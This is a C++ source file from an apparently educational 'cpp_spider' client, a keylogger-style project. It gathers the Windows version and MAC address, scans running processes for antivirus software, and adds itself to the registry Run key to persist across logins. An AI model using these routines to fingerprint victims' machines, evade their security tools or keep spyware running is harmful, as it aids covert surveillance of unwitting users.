/*
** System.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/System.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:16:10 2017 Gauthier Cler
** Last update Sun Oct 08 22:16:11 2017 Gauthier Cler
*/

#include <windows.h>
#include <sstream>
#include <Iphlpapi.h>
#include <psapi.h>
#include <iostream>
#include "System.hpp"
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "PSAPI.lib")
#pragma comment(lib, "Advapi32.lib")

Client::System::System() {
  findVersion();
  findMac();
  findAV();
}

void Client::System::findVersion() {
  const NewVersion newVersion[] = {
    { 10, 0, "Windows 10", "Windows Server 2016"},
    { 6, 3, "Windows 8.1+", "Windows Server 2012 R2"},
    { 6, 2, "Windows 8+", "Windows Server 2012"},
    { 6, 1, "Windows 7", "Windows Server 2008 R2"},
    { 6, 0, "Windows Vista", "Windows Server 2008"}
  };

  ZeroMemory(&_brutV, sizeof(OSVERSIONINFOEX));
  _brutV.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
  GetVersionEx(reinterpret_cast<OSVERSIONINFOA *>(&_brutV));
  for (auto &item : newVersion)
    if (_brutV.dwMajorVersion == item._maj
	&& _brutV.dwMinorVersion == item._min) {
      if (_brutV.wProductType == VER_NT_WORKSTATION) {
	_version = item._sys;
      } else {
	_version = item._serv;
      }
    }
  if (_brutV.dwMajorVersion == 5 && _brutV.dwMinorVersion == 1)
    _version = "Windows XP";
  if (_brutV.dwMajorVersion == 5 && _brutV.dwMinorVersion == 0)
    _version = "Windows 2000";
  if (_version.empty())
    _version = "Unknown";
}

void Client::System::findMac() {
  char					buff[MAC_BUFFSIZE];
  std::string				res;
  IP_ADAPTER_INFO			info[MAC_LISTSIZE];
  DWORD					bufflen = sizeof(info);

  if (GetAdaptersInfo(info, &bufflen) == NO_ERROR)
  {
    PIP_ADAPTER_INFO pInfo = info;
    std::sprintf(buff, "%02x:%02x:%02x:%02x:%02x:%02x", pInfo->Address[0], pInfo->Address[1],
		 pInfo->Address[2], pInfo->Address[3], pInfo->Address[4], pInfo->Address[5]);
    res.append(buff);
    _mac = res;
  }
  else
    _mac = "Couldn't get the mac address";
}

static const std::string avDico[] = {
  "Avast", "Antivirus"
};

void Client::System::findAV() {
  DWORD			allPro[MAX_PROCESS];
  DWORD			bytes;
  DWORD			nbPro;
  std::string 		proName;

  if (!EnumProcesses(allPro, sizeof(allPro), &bytes))
    return ;
  nbPro = bytes / sizeof(DWORD);
  std::cout << nbPro << std::endl;
  for (DWORD i = 0; i < nbPro; i++) {
    getProcessName(allPro[i], proName);
    for (auto &dico : avDico)
      if (proName.find(dico) != std::string::npos) {
	if (!_avirus.empty())
	  _avirus.append(" ");
	_avirus.append(proName);
      }
  }
}

const std::string &Client::System::getVersion() const {
  return (_version);
}

const std::string &Client::System::getMac() const {
  return (_mac);
}

const std::string &Client::System::getAntiVirus() const {
  return (_avirus);
}

void	Client::System::getProcessName(DWORD id, std::string &name) {
  TCHAR proName[MAX_PATH] = TEXT("<unknown>");
  HANDLE pro = OpenProcess( PROCESS_QUERY_INFORMATION |
				 PROCESS_VM_READ,
				 FALSE, id );

  name.clear();
  if (pro)
  {
    HMODULE hMod;
    DWORD cbNeeded;

    if (EnumProcessModules(pro, &hMod, sizeof(hMod), &cbNeeded))
      GetModuleBaseName(pro, hMod, proName, sizeof(proName)/sizeof(TCHAR));
  }
  name.assign(proName);
  CloseHandle(pro);
}

void Client::System::registerToStartUp(PCWSTR name, PCWSTR path) {
  HKEY hKey = nullptr;
  LONG lResult = 0;
  bool fSuccess = true;
  DWORD dwSize;
  const size_t count = MAX_PATH*2;
  wchar_t szValue[count] = {};

  wcscpy_s(szValue, count, L"\"");
  wcscat_s(szValue, count, path);
  wcscat_s(szValue, count, L"\" ");
  lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			    0, nullptr, 0, (KEY_WRITE | KEY_READ), nullptr, &hKey, nullptr);
  fSuccess = (lResult == 0);
  if (fSuccess)
  {
    dwSize = (wcslen(szValue)+1)*2;
    lResult = RegSetValueExW(hKey, name, 0, REG_SZ,
			     reinterpret_cast<BYTE *>(szValue), dwSize);
  }
  if (hKey != nullptr)
  {
    RegCloseKey(hKey);
    hKey = nullptr;
  }
}
